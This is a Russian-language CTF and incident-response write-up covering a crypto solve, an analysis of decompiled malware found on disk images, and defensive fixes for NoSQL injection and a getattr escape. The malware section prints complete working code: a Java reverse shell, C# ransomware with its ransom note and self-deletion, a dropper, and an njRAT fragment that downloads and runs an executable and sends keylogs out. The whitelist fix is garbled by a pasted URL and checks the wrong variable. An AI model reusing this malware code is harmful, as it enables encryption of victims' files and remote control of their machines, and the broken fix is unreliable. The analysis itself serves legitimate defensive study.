# CTF stage (1)
## Reverse
### Reverse 10 (writeup)

### Reverse 20 (writeup)

### Reverse 30 (writeup)


## Crypto
### Crypto 10 (writeup)

### Crypto 20 (writeup)

### Crypto 30 (writeup)
```python
# pohlig hellman attack
vals = []
mods = []
for i in range(len(ps)):
    for d_ in range(2,100000):
        if isPrime(d_) and (ps[i]-1)%d_==0 and d_ not in mods:
            d = d_
            a = pow(2,((ps[i] - 1)//d),ps[i])
            b = pow(fs[i],((ps[i] - 1)//d),ps[i])
            for k in range(1,d):
                if pow(a, k,ps[i])==b:
                    vals.append(k)
                    mods.append(d)
                    break

res = CRT_list(vals, mods) # nto{d0nt_k33p_secrets}
```



## Web
### Web 10 (writeup)
При подключении на сайт видим одностраничник. Ничего полезного нет.
Смотрим, как просходит обмен информацией с сервером ( благодаря WebSocket ).
Смотрим какие js функции имеются у нас: encrypt, decrypt.
По вебсокетам передается зашифрованное сообщение, зашлем его в decrypt в качестве аргумента и получим читабельный json


### Web 20 (writeup)

### Web 30 (writeup)


## PWN
### Pwn 10 (writeup)

### Pwn 20 (writeup)

### Pwn 30 (writeup)



---




# Incident Response stage (2)
`Выдан образ машины linux(vmdk)`


## First step
1. Import vmdk to virtualbox
2. Reset Sergey/Root password via grub mode
3. Login with sergey(root)


## First Recon on machine 
После беглого анализа системы видим интересные файлы и каталоги:
- /home/sergey/minecraft.jar
- /home/sergey/VTropia.exe
- /home/sergey/Download (folder)





## Minecraft.jar
( /home/sergey/minecraft.jar)

В истории к заданиям сказано, что Валера запустил майнкрафт на компьютере. 
Найдем одноименный файл и разреверсим его.
При помощи jadx декомпилируем класс `Malware`
```java 
package Malware;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

/* loaded from: minecraft.jar:Malware/ReverseShell.class */
public class ReverseShell {
    public static void main(String[] args) {
        try {
            Process p = new ProcessBuilder("/usr/bin/bash").redirectErrorStream(true).start();
            Socket s = new Socket("192.168.126.129", 4444);
            InputStream pi = p.getInputStream();
            InputStream pe = p.getErrorStream();
            InputStream si = s.getInputStream();
            OutputStream po = p.getOutputStream();
            OutputStream so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) {
                    so.write(pi.read());
                }
                while (pe.available() > 0) {
                    so.write(pe.read());
                }
                while (si.available() > 0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                try {
                    Thread.sleep(50L);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                try {
                    p.exitValue();
                    break;
                } catch (Exception e2) {
                }
            }
            p.destroy();
            s.close();
        } catch (IOException e3) {
            e3.printStackTrace();
        }
    }
}
```
Видно, что впо создает реверс шелл(который обращается к `192.168.126.129:4444`).

## VTropia.exe (md5)
Заметим , что это бинарь на дотнете. 
```bash=
$ file VTropia.exe                                   
Vropia.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```
используем для декомпиляции https://github.com/icsharpcode/AvaloniaILSpy
```csharp

internal class Config
{
	public static string IP = "NiA3XjonOFogOlYaPBAhXT8eJhwxHVoaNlpZBTQFI10VXi8/DS01NDEQOhU=";

	public static string User = "AwQ3JBU5IxY2GyZQ";

	public static string Message = "AlojBRAnJxolCyEFABsYCjwnOlwaMykDNisrRjVbMxcQKC8cDgQ5FywPBwUBJDkLChk5HDYBKx81BSsXPDc3XDYUPgUmLx8uARE9CwkzVgUeWzgUDlsvWxUsN1wNBDkUPxsLFywBPgMJJy1DDTACFDMvXQk6AiMGDnA1AQYhLV0EDjoYGjdfFzcvL0YeLDAZFCwkCw0UWwo0JD0pLAE+Gho8PR81MCQUM1ojHTsoI1wjJAAXNiIEWQENKjQwMTkRGhInNwMFVDw9AhkANXAlGAAfAzUGJFkUBhkHKAADEUYUDxU0O1wgCw0EKV8/Gy4UKwouAzFHOQk3EV0UBj8/XgM3PAsIBAcBBxstWAd6OhUaMzUANi8/CR4gAR47KAILD3A9BQAbLVwHJCoGCkY5CjdaBRo1LzAJAwJMFSUEWgEAAD4KPxE+ADAZWgAwIAIG";

	public static string Key = "V2hlbllvdWxsQ29tZUhvbWU=";

	public static string AES { get; set; }

	public static void Decrypt(string key)
	{
		Key = Utils.DecodeBase64(Key) + Utils.DecodeBase64(key);
		IP = Utils.DecodeBase64(Utils.Xor(Utils.DecodeBase64(IP), Key));
		User = Utils.DecodeBase64(Utils.Xor(Utils.DecodeBase64(User), Key));
		Message = Utils.DecodeBase64(Utils.Xor(Utils.DecodeBase64(Message), Key));
	}
}
internal class Crypt
{
	public static void Process(string password)
	{
		password = Utils.CalculateKey();
		string[] logicalDrives = Directory.GetLogicalDrives();
		for (int i = 0; i < logicalDrives.Length; i++)
		{
			EncryptDirectory(logicalDrives[i], password);
		}
	}

	public static void EncryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[205]
			{
				".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", "jpeg", ".png",
				".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
				".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp",
				".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass",
				".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb",
				".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map",
				".wmo", ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf",
				".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx",
				".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00",
				".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge",
				".kdb", ".db0", ".dba", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod",
				".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik",
				".epk", ".rgss3a", ".pak", ".big", "wallet", ".wotreplay", ".xxx", ".desc", ".py", ".m3u",
				".flv", ".js", ".css", ".rb", ".p7c", ".pk7", ".p7b", ".p12", ".pfx", ".pem",
				".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl",
				".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2",
				".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr",
				".indd", ".ai", ".eps", ".pdf", ".pdd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd",
				".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk",
				".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc",
				".odm", ".odp", ".ods", ".odt", ".ico"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				if (!directories[j].Contains("Windows") && !directories[j].Contains("Program Files") && !directories[j].Contains("Program Files (x86)"))
				{
					EncryptDirectory(directories[j], password);
				}
			}
		}
		catch
		{
		}
	}

	public static void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		try
		{
			File.WriteAllBytes(file, bytes2);
			string text = ".p4blm";
			File.Move(file, file + text);
		}
		catch (UnauthorizedAccessException)
		{
		}
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 8, 3, 6, 2, 4, 9, 7 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}
}

internal class Program
{
	private static void Main(string[] args)
	{
		Execute();
	}

	private static void Execute()
	{
		if (Utils.CheckUser())
		{
			Environment.Exit(0);
		}
		Thread.Sleep(5000);
		Config.Decrypt("SWxsU3RvcFRoaXM=");
		Crypt.Process(Config.AES);
		Utils.LeaveMessage();
		Utils.Annihilate();
	}
}

internal class Utils
{
	public static string CalculateKey()
	{
		try
		{
			return MD5("HelloWin" + Config.User);
		}
		catch
		{
			return "d7d129356554062f0311ee22d59ea9eb";
		}
	}

	public static void LeaveMessage()
	{
		File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\info.txt", Config.Message);
	}

	public static bool CheckUser()
	{
		try
		{
			if (Environment.UserName != "Administrator")
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void Annihilate()
	{
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C timeout 2 && Del /Q /F " + Application.get_ExecutablePath(),
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
	}

	public static string DecodeBase64(string data)
	{
		try
		{
			if (string.IsNullOrEmpty(data))
			{
				return null;
			}
			return Encoding.UTF8.GetString(Convert.FromBase64String(data));
		}
		catch
		{
			return null;
		}
	}

	public static string Xor(string data, string key)
	{
		try
		{
			if (string.IsNullOrEmpty(data))
			{
				return null;
			}
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < data.Length; i++)
			{
				int utf = data[i] ^ key[i % key.Length];
				stringBuilder.AppendFormat("{0}", char.ConvertFromUtf32(utf));
			}
			return stringBuilder.ToString();
		}
		catch
		{
			return null;
		}
	}

	public static string MD5(string data)
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(data);
			bytes = ((HashAlgorithm)CryptoConfig.CreateFromName("MD5")).ComputeHash(bytes);
			return BitConverter.ToString(bytes).Replace("-", string.Empty).ToLower();
		}
		catch
		{
			return null;
		}
	}
}
```

Давайте исполним следующую функцию `Config.Decrypt("SWxsU3RvcFRoaXM=");`:
```csharp
public static void Decrypt(string key)
{
    Key = Utils.DecodeBase64(Key) + Utils.DecodeBase64(key);
    IP = Utils.DecodeBase64(Utils.Xor(Utils.DecodeBase64(IP), Key));
    User = Utils.DecodeBase64(Utils.Xor(Utils.DecodeBase64(User), Key));
    Message = Utils.DecodeBase64(Utils.Xor(Utils.DecodeBase64(Message), Key));
}
```
Получим 
```
Key = WhenYoullComeHomeIllStopThis
IP = https://pastebin.com/raw/VRjvXMu1
User = NTI-User
Message = 
Sad to say, but all your files have been encrypted!

But don't cry, there's the way to recover them - pay 500$ in BTC to this wallet:
3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy

You have 24 hours. After them your files will stay unaccessible for next eternity.

```

Рассмотрим работу данного вредоноса. Вот его алгоритм:
1) `Process` запускает `EncryptDirectory`, запускающий `EncryptFile` с паролем из `CalculateKey`. ("084b988baa7c8d98cda90c5fe603c560")
2) EncryptFile - берет sha256 от пароля и вызывает AES_Encrypt(data_to_be_encrypted, key) т.е. шифрует файл при помощи AES_Encrypt
3) AES_Encrypt - какой-то кастомный aes cbc. вытащим ключ и iv:
```charp=
using System;
using System.Security.Cryptography;
using System.Security;
using System.Text;
class HelloWorld {
  static void Main() {
        byte[] passwordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("084b988baa7c8d98cda90c5fe603c560"));
    	byte[] array = null;
		byte[] salt = new byte[8] { 1, 8, 3, 6, 2, 4, 9, 7 };
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		Console.WriteLine(Convert.ToBase64String(rijndaelManaged.Key));// T+4g/6PSPe3bkJsNSbW7pdpcBzgzXoYVyG3ks4sBZtQ=
		Console.WriteLine(Convert.ToBase64String(rijndaelManaged.IV)); //sx1emNG67pfLpNCg0B4bUw==
  }
}
```

Напишем декриптор:
```python=
from base64 import b64decode as b
from Crypto.Cipher import AES
key = b('T+4g/6PSPe3bkJsNSbW7pdpcBzgzXoYVyG3ks4sBZtQ=')
iv = b('sx1emNG67pfLpNCg0B4bUw==')
files = ['./Important.txt.txt.p4blm',]
for fname in files:
    aes = AES.new(key,iv=iv,mode=AES.MODE_CBC)
    c = open(fname,'rb').read()
    plain = aes.decrypt(c)
    open(fname.replace('.p4blm',''),'wb').write(plain)
    print(plain)
```
Запустим на `Important.txt.txt.p4blm` и получим `CSh4RpR@n50mWar3z4ReSti11Us3fUl`. 


----

# Incident Response (3)
`Выдан образ машины windows(vmdk)`


## Doom.exe
Открываем в Ilspy и понимаем, что это программа дроппер:
```csharp=
internal class Program
{
	private static void Main(string[] args)
	{
		if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dropped"))
		{
			Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dropped");
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dropped\\";
		File.WriteAllBytes(text + "1.exe", DoomResources._1);
		File.WriteAllBytes(text + "2.exe", DoomResources._2);
		File.WriteAllBytes(text + "3.exe", DoomResources._3);
		File.WriteAllBytes(text + "4.exe", DoomResources._4);
		File.WriteAllBytes(text + "5.exe", DoomResources._5);
		Process.Start(text + "1.exe");
		Process.Start(text + "2.exe");
		Process.Start(text + "3.exe");
		Process.Start(text + "4.exe");
		Process.Start(text + "5.exe");
		Thread.Sleep(60000);
		File.Delete(text + "1.exe");
		File.Delete(text + "2.exe");
		File.Delete(text + "3.exe");
		File.Delete(text + "4.exe");
		File.Delete(text + "5.exe");
	}
}

```
т.е. он закидывает файлы в Appdata/Dropped , а потом их удаляет. Заходим в ресурсы `doom.exe`и экспортируем экзешники, которые он создает.

## Njrat
```python=
						}
						else
						{
							if (Operators.CompareString(left, "ll", false) == 0)
							{
								Njrat.Cn = false;
								return;
							}
							if (Operators.CompareString(left, "kl", false) == 0)
							{
								Njrat.Send("kl" + Njrat.Y + Njrat.ENB(ref Njrat.kq.Logs));
								return;
							}
							if (Operators.CompareString(left, "pas", false) == 0)
							{
								try
								{
									string text4 = Interaction.Environ("temp") + "/pass.exe";
									if (!File.Exists(text4))
									{
										try
										{
											WebClient webClient = new WebClient();
											webClient.DownloadFile("https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0", text4);
											Process.Start(text4);
										}
										catch (Exception ex3)
										{
										}
									}
								}
								catch (Exception ex4)
								{
								}
								try
								{
									string path = Interaction.Environ("temp") + "/temp.txt";
									string text5 = File.ReadAllText(path);
									Njrat.Send("pas" + Njrat.Y + Njrat.ENB(ref text5));
								}
                                
							if (Operators.CompareString(left, "kl", false) == 0)
							{
								Njrat.Send("kl" + Njrat.Y + Njrat.ENB(ref Njrat.kq.Logs));
								return;
							}
```
видим, что в 

![](https://i.imgur.com/I2Ra6yb.png)
![](https://i.imgur.com/dWD7wG5.png)
![](https://i.imgur.com/rvPfjsS.png)

---

# 3 этап

# ch2






## cc
поменять соль!
Заменить пароли в docker-compose.yaml 
- `db.py` 
Имеется множество `nosql injection`

```python=
# 42
r = self.users.update_one({"$where": f"this.username == '{username}'"}, {"$set": {"admin": is_admin}})
```

```python=
# 54
u = self.users.find({"$where": f"this.username == '{username}' && this.password == '{hashed}'"})[0]
```

```python=
# 62
r = self.users.update_one({"$where": f"this.uid == '{uid}'"}, {"$set": {"password": hashed}})
```

```python=
# 70
u = self.users.find({"$where": f"this.username == '{username}'"})[0]

```

```python=
# 78
u = self.users.find({"$where": f"this.username == '{username}'"})[0]
```


```python=
# 86
u = self.users.find({"$where": f"this.uid == '{uid}'"}, {"_id":0})[0]
```

```python=
# 105
p = self.permissions.find({"$where": f"this.username == '{username}'"})[0]['permissions']
```

```python=
# 114
p = self.permissions.find({"$where": f"this.uid == '{user['uid']}'"})[0]['permissions']
```

```python=
# 121
self.users.delete_one({"$where": f"this.username == '{username}'"})  
```

```python=
# 125
self.permissions.delete_one({"$where": f"this.username == '{username}'"})
```

```python=
# 139
backup = self.backups.find({"$where": f"this.bid == '{bid}'"}, {'bid':0, '_id':0})

```





```python=
    def new_user(self, username, email, password, is_admin):
        self.__check_connection()
        hashed = self.hash_password(password)
        try:
            next_uid = self.users.find_one(sort=[('uid', pymongo.DESCENDING)])['uid'] + 1
        except Exception as e:
            next_uid = 1
        self.users.insert_one({"username":username, "email":email, "password":hashed, "admin": is_admin, "uid": next_uid})
        return True
```
в `db.py` все в nosql и 34 строка возможно гонка,

## emulator

1) в utils.py map_action
```python
def map_action(cl, action):
    for act in action.split('.'):
        cl = getattr(cl, act)
    return cl
```

заведем whitelist для действий, которые есть в системе, чтобы не допустить python jail при помощи getattr:
```python=
wl = ['get_type', 'add_element', 'set_sensitivity', 'get_sensitivity', 'enable', 'disable', 'get_enabled', 'get_type', 'add_element', 'get_image', 'enable', 'disable', 'get_enabled', 'get_type', 'add_element', 'set_floor', 'get_floor', 'enable', 'disable', 'get_enabled', 'get_type', 'add_element', 'get_type', 'add_element', 'set_sensitivity', 'get_sensitivity', 'enable', 'disable', 'get_ehttps://hackmd.io/@Egorovmylove/roma_resultnabled', 'get_type', 'add_element', 'get_image', 'enable', 'disable', 'get_enabled', 'get_type', 'add_element', 'set_floor', 'get_floor', 'enable', 'disable', 'get_enabled', 'get_type', 'add_element', 'get_type', 'add_element', 'set_sensitivity', 'get_sensitivity', 'enable', 'disable', 'get_enabled', 'get_type', 'add_element', 'get_image', 'enable', 'disable', 'get_enabled', 'get_type', 'add_element', 'set_backup_url', 'get_backup_url', 'backup', 'get_backup_date', 'update_data', 'send_backup', 'full_clean', 'get_type', 'add_element', 'set_sensitivity', 'get_sensitivity']
def map_action(cl, action):
    for act in action.split('.'):
        if action in wl:
            cl = getattr(cl, act)
        else:
            cl = 'POSHEL VON'
    return cl
```
POC в контейнере эмулятора:
```python=
import requests
requests.post('http://127.0.0.1:8888/execute',json={"element":"Elevator","action":"__hash__","args":[]}).text
# '{"result":8747703940928,"status":"ok"}\n'
```









https://hackmd.io/@Egorovmylove/roma_result



